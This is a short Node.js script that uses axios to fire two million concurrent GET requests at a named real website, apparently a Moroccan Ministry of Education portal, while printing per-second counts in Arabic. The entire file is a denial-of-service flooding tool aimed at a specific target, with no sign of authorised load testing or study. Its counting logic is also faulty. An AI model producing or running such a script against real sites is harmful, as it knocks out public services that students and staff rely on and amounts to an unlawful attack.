const axios = require('axios');

async function run() {
  const url = 'https://massar.men.gov.ma';
  const concurrency = 2000000;
  let requestsCount = 0;
  let responsesCount = 0;

  const requests = [];
  for (let i = 0; i < concurrency; i++) {
    requests.push(axios.get(url));
  }

  setInterval(() => {
    console.log(`تم إرسال ${requestsCount} طلب وتم استلام ${responsesCount} استجابة في الثانية الحالية.`);
    requestsCount = 0;
    responsesCount = 0;
  }, 1000);

  for (const request of requests) {
    await request;
    requestsCount++;
    responsesCount++;
  }
}

run();
